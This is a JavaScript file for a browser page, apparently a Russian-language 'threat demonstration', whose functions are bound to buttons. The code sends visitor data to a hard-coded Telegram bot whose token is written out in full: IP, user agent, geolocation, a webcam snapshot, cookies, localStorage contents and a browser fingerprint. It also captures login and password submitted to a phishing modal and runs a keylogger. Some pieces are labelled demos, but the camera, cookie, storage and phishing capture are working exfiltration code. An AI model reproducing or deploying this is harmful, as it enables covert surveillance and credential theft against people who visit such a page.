// script.js

// --- Настройки Telegram бота ---
const TELEGRAM_BOT_TOKEN = '7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60';
const TELEGRAM_CHAT_ID = '7408565938';

// --- Универсальные утилиты ---
function logToPage(text, cssClass = '') {
  const logEl = document.getElementById('log-content');
  const time = new Date().toLocaleTimeString();
  const line = document.createElement('div');
  line.textContent = `[${time}] ${text}`;
  if (cssClass) line.classList.add(cssClass);
  logEl.appendChild(line);
  logEl.parentElement.scrollTop = logEl.parentElement.scrollHeight;
}

async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML'
      })
    });
  } catch (err) {
    console.error('Ошибка отправки в Telegram:', err);
  }
}

// --- Основные угрозы ---
async function logIP() {
  logToPage('Запрашиваем IP...', 'log-ip');
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const { ip } = await res.json();
    logToPage(`IP-адрес: ${ip}`, 'log-ip');
    sendToTelegram(`⚠️ <b>IP-адрес:</b> <code>${ip}</code>`);
  } catch {
    logToPage('Не удалось получить IP', 'log-ip');
  }
}

function logDNS() {
  const host = window.location.hostname;
  logToPage(`DNS (hostname): ${host}`, 'log-dns');
  sendToTelegram(`⚠️ <b>DNS (hostname):</b> <code>${host}</code>`);
}

function logUA() {
  const ua = navigator.userAgent;
  logToPage(`User-Agent: ${ua}`, 'log-useragent');
  sendToTelegram(`⚠️ <b>User-Agent:</b> <code>${ua}</code>`);
}

function logGeolocation() {
  logToPage('Запрашиваем геолокацию...', 'log-geo');
  if (!navigator.geolocation) {
    logToPage('Геолокация не поддерживается', 'log-geo');
    return;
  }
  navigator.geolocation.getCurrentPosition(pos => {
    const { latitude, longitude } = pos.coords;
    logToPage(`Геолокация: ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`, 'log-geo');
    sendToTelegram(`⚠️ <b>Геолокация:</b> <code>${latitude}, ${longitude}</code>`);
  }, err => {
    logToPage('Ошибка геолокации: ' + err.message, 'log-geo');
  });
}

async function logCamera() {
  logToPage('Запрашиваем доступ к камере...', 'log-camera');
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    // Захват кадра
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);

    // Остановить камеру
    stream.getTracks().forEach(t => t.stop());

    // Получить DataURL и Blob
    const dataUrl = canvas.toDataURL('image/png');
    const blob = await (await fetch(dataUrl)).blob();

    logToPage('Фото с камеры сделано.', 'log-camera');

    // Отправить фото
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('photo', blob, 'snapshot.png');

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form
    });

    logToPage('Фото отправлено в Telegram.', 'log-camera');
  } catch (err) {
    logToPage('Ошибка камеры: ' + err.message, 'log-camera');
  }
}

function openPhishing() {
  document.getElementById('phishing-modal').style.display = 'flex';
  logToPage('Открыта фишинговая форма', 'log-username');
  sendToTelegram('⚠️ <b>Открыта фишинговая форма</b>');
}

function stealCookies() {
  const ck = document.cookie || '(пусто)';
  logToPage('Cookies: ' + ck, 'log-cookie');
  sendToTelegram(`⚠️ <b>Cookies:</b> <code>${ck}</code>`);
}

function stealPasswords() {
  const fake = 'user1:pass1\nuser2:pass2';
  logToPage('Кража паролей (демо):\n' + fake, 'log-password');
  sendToTelegram(`⚠️ <b>Кража паролей:</b>\n<code>${fake}</code>`);
}

// --- Обработчики фишинга ---
const phModal = document.getElementById('phishing-modal');
const phForm  = document.getElementById('phishing-form');
document.getElementById('phishing-close').onclick = () => phModal.style.display = 'none';
window.onclick = e => { if (e.target === phModal) phModal.style.display = 'none'; };

phForm.addEventListener('submit', e => {
  e.preventDefault();
  const user = phForm.login.value;
  const pwd  = phForm.password.value;
  logToPage(`Фишинг: логин=${user}, пароль=${'*'.repeat(pwd.length)}`, 'log-username');
  sendToTelegram(`⚠️ <b>Фишинг!</b>\nЛогин: <b>${user}</b>\nПароль: <b>${pwd}</b>`);
  phForm.reset();
  phModal.style.display = 'none';
});

// --- Дополнительные функции ---
function startKeylogger() {
  logToPage('Кейлоггер запущен', 'log-password');
  sendToTelegram('⚠️ <b>Кейлоггер активирован</b>');
  document.addEventListener('keydown', e => {
    if (e.key.length === 1) {
      logToPage('Кейлоггер: ' + e.key, 'log-password');
      sendToTelegram(`⚠️ <b>Кейлоггер:</b> <code>${e.key}</code>`);
    }
  }, { once: true });
}

function fingerprint() {
  const fp = [
    navigator.userAgent,
    navigator.language,
    screen.width + 'x' + screen.height,
    screen.colorDepth + '-bit',
    navigator.platform
  ].join(' | ');
  logToPage('Отпечаток: ' + fp, 'log-dns');
  sendToTelegram(`⚠️ <b>Отпечаток:</b>\n<code>${fp}</code>`);
}

function simulateGeoIP() {
  const fake = '89.123.45.67, Москва, Россия';
  logToPage('Эмуляция геолокации: ' + fake, 'log-geo');
  sendToTelegram(`⚠️ <b>Эмуляция геолокации:</b> <code>${fake}</code>`);
}

function leakCookiesLocalStorage() {
  const ck = document.cookie;
  const ls = JSON.stringify(localStorage);
  logToPage(`Утечка:\nCookies: ${ck}\nLocalStorage: ${ls}`, 'log-cookie');
  sendToTelegram(`⚠️ <b>Утечка данных:</b>\nCookies:<code>${ck}</code>\nLS:<code>${ls}</code>`);
}

function scareMessage() {
  alert('🚨 ВНИМАНИЕ! Обнаружена угроза!');
  logToPage('Показано сообщение о вирусе', 'log-password');
  sendToTelegram('⚠️ <b>Показано сообщение о вирусе</b>');
}

function driveByDownload() {
  logToPage('Эмуляция drive-by загрузки', 'log-password');
  sendToTelegram('⚠️ <b>Эмуляция drive-by загрузки</b>');
}

function ransomwareFake() {
  alert('Ваши файлы зашифрованы! Оплатите 1 BTC.');
  logToPage('Показан ransomware (демо)', 'log-password');
  sendToTelegram('⚠️ <b>Показан ransomware (демо)</b>');
}

// --- Привязка обработчиков ---
window.addEventListener('DOMContentLoaded', () => {
  document.getElementById('log-ip').onclick        = logIP;
  document.getElementById('log-dns').onclick       = logDNS;
  document.getElementById('log-ua').onclick        = logUA;
  document.getElementById('log-geo').onclick       = logGeolocation;
  document.getElementById('log-camera').onclick    = logCamera;
  document.getElementById('log-phishing').onclick  = openPhishing;
  document.getElementById('log-cookie').onclick    = stealCookies;
  document.getElementById('log-passwords').onclick = stealPasswords;

  document.getElementById('btn-keylogger').onclick    = startKeylogger;
  document.getElementById('btn-fingerprint').onclick  = fingerprint;
  document.getElementById('btn-sim-geoip').onclick    = simulateGeoIP;
  document.getElementById('btn-leak-cookies').onclick = leakCookiesLocalStorage;
  document.getElementById('btn-scare-msg').onclick    = scareMessage;
  document.getElementById('btn-driveby').onclick      = driveByDownload;
  document.getElementById('btn-ransomware').onclick   = ransomwareFake;
});
